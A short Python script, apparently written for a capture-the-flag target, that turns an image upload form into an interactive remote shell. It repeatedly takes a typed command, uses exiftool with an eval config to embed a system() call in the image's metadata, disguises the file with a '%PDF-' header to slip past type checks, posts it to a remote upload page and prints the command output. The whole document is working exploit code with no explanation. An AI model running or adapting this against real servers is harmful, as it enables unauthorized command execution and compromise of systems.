import os
import requests
payload=""
while payload!="exit":
	payload=input("$> ")
	os.system("cp image.jpg_original image.jpg")
	os.system('exiftool -config eval.config image.jpg -eval=\'system("'+payload+'")\'>/dev/null 2>&1')
	f=open("image.jpg","rb").read()
	file=b"%PDF-"+f
	with open("image.jpg","wb") as f:
	    f.write(file)
	url='https://ruthless.monster/exif/index.php'
	files={'fileToUpload': open('image.jpg','rb')}
	r=requests.post(url,files=files)
	print(r.text[299:-1147])